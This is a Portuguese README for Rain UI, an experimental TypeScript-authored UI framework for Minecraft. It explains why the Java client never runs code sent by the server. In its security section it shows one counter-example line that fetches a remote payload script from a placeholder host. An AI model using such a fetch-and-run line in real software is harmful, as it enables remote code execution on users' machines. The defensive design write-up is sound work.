# Rain UI

[English](./README.md) | **Português**

**Um framework de UI declarativa para o Minecraft Java Edition, movido a TypeScript.**

> **Escreva em TypeScript. Rode em Java.**

Rain UI é um framework experimental para construir interfaces do Minecraft com TypeScript e um modelo de UI
declarativo.

O lado TypeScript descreve **como a interface é e quais interações estão disponíveis**. O cliente do Minecraft roda um
runtime Java que interpreta um **protocolo de UI restrito e validado**.

---

## ⚠️ Estado do desenvolvimento

> **Rain UI está em desenvolvimento ativo. Ainda não está pronto para produção.**

A API, o protocolo, o modelo de componentes, os schemas, o comportamento do runtime e a estrutura do projeto ainda estão
mudando.

**Espere mudanças incompatíveis.**

Nesta fase, Rain UI deve ser visto como um **projeto experimental, para desenvolvimento, pesquisa e experimentação**, e
não como um framework estável com garantias de API a longo prazo.

Se você construir algo sobre o Rain UI hoje, conte com adaptar o seu código conforme o projeto evolui.

---

# Arquitetura

Rain UI separa de propósito a **escrita da UI** da **execução da UI**.

```text
                 DEVELOPMENT TIME
                 ────────────────

        TypeScript / TSX Application
                    │
                    │
                    ▼
          ┌───────────────────┐
          │    Rain UI Core   │
          │                   │
          │  Components       │
          │  Contracts        │
          │  Schemas          │
          └─────────┬─────────┘
                    │
                    │ Compile / Serialize
                    ▼
             UI Contract / Data
                    │
                    │
════════════════════╪══════════════════════════
                    │
                    │         NETWORK
                    │
                    ▼
              Minecraft Server
                    │
                    │ Protocol Messages
                    ▼
          ┌───────────────────┐
          │ Minecraft Client  │
          │                   │
          │   Rain UI Runtime │
          │        (Java)     │
          └─────────┬─────────┘
                    │
                    ▼
               Minecraft UI
```

A fronteira que importa é a que fica entre o **protocolo do servidor** e o **runtime do cliente**.

O servidor **não** envia TypeScript nem JavaScript executável para o cliente.

Em vez disso, ele envia dados estruturados que seguem um schema predefinido.

---

# Por que o cliente não executa código do servidor

Rain UI foi pensado em torno de um **protocolo de dados**, e não de um modelo de execução remota de código.

O servidor pode enviar algo, conceitualmente, assim:

```json
{
  "screen": "example:overview",
  "properties": {
    "name": "Example Town",
    "banner": "example:textures/town/banner"
  }
}
```

Também pode pedir uma ação predefinida:

```json
{
  "action": "example:accept-request",
  "fields": {
    "playerId": "..."
  }
}
```

Mas o servidor não pode enviar algo assim:

```json
{
  "code": "fetch('https://example.invalid/payload.js').then(...)"
}
```

e esperar que o cliente execute.

O runtime do Rain UI no cliente não tem nenhum interpretador de JavaScript ou TypeScript feito para executar código
arbitrário vindo do servidor.

O cliente executa **o runtime confiável do Rain UI**, não código fornecido pelo servidor.

---

# A fronteira de segurança

A arquitetura pode ser simplificada assim:

```text
                    SERVER
                      │
                      │
                      │  DATA
                      │
                      ▼
              ┌───────────────┐
              │    Protocol   │
              │    Schema     │
              └───────┬───────┘
                      │
                   validate
                      │
                      ▼
              ┌───────────────┐
              │ Rain UI Java  │
              │    Runtime    │
              └───────┬───────┘
                      │
                      │ allowed
                      │ operations
                      ▼
                 Minecraft
                    UI
```

O servidor controla os **dados**.

O cliente controla a **execução**.

Essa distinção é a base do Rain UI.

---

## Um modelo mental útil

Pense no Rain UI mais como um navegador recebendo um documento do que como um cliente recebendo JavaScript arbitrário.

O servidor pode descrever:

```text
"Crie uma coluna."

"Coloque este texto dentro dela."

"Mostre este item."

"Defina esta propriedade."

"Quando o jogador clicar neste botão,
peça a ação X."
```

O cliente já sabe o que essas operações significam.

O servidor não pode inventar comportamento executável novo.

```text
SERVER
  │
  │ "column"
  │ "text"
  │ "item"
  │ "action: example:accept-request"
  ▼
CLIENT RUNTIME
  │
  ├── create column
  ├── render text
  ├── render item
  └── dispatch predefined action
```

---

# Contratos

Toda tela tem um contrato que descreve os dados e as interações que ela expõe.

Por exemplo:

```ts
const actions = {
  "example:accept-request": {
    fields: {
      playerId: {
        kind: "string",
      },
    },
    kind: "object",
  },

  "example:deny-request": {
    fields: {
      playerId: {
        kind: "string",
      },
    },
    kind: "object",
  },
};
```

O contrato define **o que é permitido**, em vez de deixar o servidor definir comportamento arbitrário.

Conceitualmente:

```text
                 Screen Contract
                       │
          ┌────────────┴────────────┐
          │                         │
      Properties                  Actions
          │                         │
          ▼                         ▼
       Data only              Known operations
```

Isso deixa o protocolo explícito, inspecionável e implementável de forma independente pelo runtime Java.

---

# Por que o TypeScript não vai para o cliente

TypeScript é a **linguagem de escrita** do Rain UI.

Não é a linguagem executada pelo cliente do Minecraft.

```text
        TypeScript / TSX
               │
               │ authoring
               ▼
        Rain UI Compiler
               │
               │ contract / data
               ▼
          Java Runtime
               │
               ▼
          Minecraft
```

Essa distinção é intencional.

Quem desenvolve ganha a ergonomia do TypeScript e do TSX:

* segurança de tipos
* suporte da IDE
* componentes
* composição
* renderização declarativa
* abstrações reutilizáveis

enquanto o cliente do Minecraft só precisa entender o protocolo do Rain UI.

---

# Controlado pelo servidor não quer dizer executável pelo servidor

Rain UI foi feito para deixar o servidor controlar o **conteúdo e o estado** das interfaces sem dar a ele capacidade de
executar qualquer coisa no cliente.

Por exemplo, o servidor pode controlar:

* qual tela é mostrada
* textos
* imagens e referências a assets suportadas pelo protocolo
* props dos componentes
* ações disponíveis
* valores mostrados ao jogador

Mas essas capacidades são limitadas pelo runtime e pelo seu protocolo.

O servidor não consegue criar uma primitiva nova no cliente só enviando código executável.

Se uma capacidade nova for adicionada ao Rain UI, ela precisa ser implementada como parte do runtime confiável do
cliente.

```text
        Server
          │
          │ "use component X"
          ▼
    ┌──────────────┐
    │ Protocol     │
    │ validation   │
    └──────┬───────┘
           │
           ▼
    Does the runtime
    know component X?
       │          │
      YES         NO
       │          │
       ▼          ▼
    Execute      Reject /
    operation    ignore
```

---

# Segurança faz parte da arquitetura

A segurança não é uma camada extra adicionada depois do sistema de UI.

O próprio protocolo foi desenhado em torno de uma separação rígida:

| Camada       | Responsabilidade                                         |
|--------------|----------------------------------------------------------|
| TypeScript   | Escrita da UI                                            |
| Contratos    | Definem os dados e as interações permitidos              |
| Protocolo    | Transporta dados estruturados                            |
| Runtime Java | Valida e interpreta as mensagens do protocolo            |
| Minecraft    | Renderiza e executa o comportamento confiável do cliente |

A regra fundamental é:

> **Dado não confiável vindo do servidor nunca pode virar código executável no cliente.**

---

# Contra o que isso protege

Essa arquitetura existe especificamente para impedir que um servidor transforme mensagens de UI em execução arbitrária
de programas no cliente.

Por exemplo, um servidor malicioso não deve conseguir enviar um pacote de UI contendo:

```text
JavaScript
TypeScript
Java bytecode
Native code
Arbitrary shell commands
```

e fazer o runtime do Rain UI executar.

As mensagens recebidas são interpretadas de acordo com as capacidades que o runtime do cliente já implementa.

---

# Aviso importante sobre segurança

A arquitetura do Rain UI foi desenhada para minimizar a confiança depositada no servidor, mas **a implementação ainda
precisa ser auditada e endurecida**.

Um protocolo seguro ainda pode ter vulnerabilidades.

Por exemplo, bugs em:

* parsing de pacotes
* validação de schema
* tratamento de assets
* desserialização
* carregamento de recursos
* integrações nativas
* no próprio runtime Java

podem criar problemas de segurança.

Por isso, o Rain UI **não** afirma que a implementação atual é formalmente verificada nem totalmente livre de
vulnerabilidades.

O objetivo é mais forte e mais concreto:

> **O protocolo foi desenhado para que código arbitrário vindo do servidor nem seja, para começo de conversa, uma
> primitiva de execução suportada.**

Bugs de segurança continuam sendo bugs, mas executar código arbitrário do servidor não é o mecanismo pretendido do
framework.

---

# Exemplo

Uma aplicação Rain UI pode definir:

```tsx
import { defineScreen } from "@rain-ui/core";
import { actions, properties } from "./overview.contract";

export default defineScreen({
  id: "example:overview",

  properties,
  actions,

  render: (p, a) => (
    <column gap={6} padding={8}>
      <row gap={4}>
        <item value={p.banner} />

        <column gap={2}>
          <text value={p.name} />
          <text value={p.description} />
        </column>
      </row>
    </column>
  ),
});
```

O código TypeScript faz parte do **ambiente de escrita da aplicação**.

O cliente do Minecraft não recebe nem executa esse código-fonte.

A descrição da UI resultante é representada pelo protocolo do Rain UI e interpretada pelo runtime Java.

---

# Estrutura do projeto

```text
rain-ui/
│
├── packages/       # TypeScript framework packages
├── schema/         # Protocol and type schemas
├── specs/          # Design and protocol specifications
├── examples/       # Example applications
├── docs/           # Documentation
│
└── java/           # Minecraft Java runtime
```

A separação entre `schema`, `packages` e `java` é intencional: o protocolo deve ser compreensível independentemente da
implementação que o consome.

---

# Objetivos de design

Rain UI está sendo construído em torno de alguns princípios.

### Declarativo

Descrever a UI em vez de gerenciar os detalhes de renderização na mão.

### Tipado

Contratos devem ser representados como tipos e validados o mais cedo possível.

### Controlado pelo servidor

O servidor deve poder fornecer interfaces e dados dinâmicos.

### Execução no cliente confiável

O runtime do cliente continua responsável pela execução.

### Guiado pelo protocolo

A fronteira entre servidor e cliente deve ser explícita e inspecionável.

### Sem código arbitrário no cliente

Dados de UI vindos do servidor nunca devem virar, implicitamente, código executável no cliente.

---

# Estado atual

**Rain UI é um software experimental.**

O projeto está sendo desenhado e implementado ativamente.

Espere:

* mudanças incompatíveis na API
* mudanças no protocolo
* componentes incompletos
* documentação incompleta
* mudanças na estrutura dos pacotes
* mudanças no comportamento do runtime

Não conte com a estabilidade do protocolo nem das APIs atuais.

Se o projeto te interessa, acompanhe o repositório e experimente.

---

# Contribuindo

Rain UI ainda está cedo o bastante para que feedback de arquitetura seja especialmente valioso.

Antes de fazer mudanças grandes, vale ler:

* [`AGENTS.md`](./AGENTS.md)
* [`CODE_STYLE.md`](./CODE_STYLE.md)
* [`docs/`](./docs/)
* [`specs/`](./specs/)

Para mudanças no protocolo ou no modelo de segurança, documentar o design e o modelo de ameaça é especialmente
importante.

---

# Licença

Rain UI é licenciado sob a **Apache License 2.0**.

Veja [`LICENSE`](./LICENSE) para o texto completo da licença.

---

<p align="center">
  <strong>Rain UI</strong><br>
  Interfaces declarativas para o Minecraft Java Edition.<br><br>
  <em>Escreva em TypeScript. Rode em Java.</em>
</p>
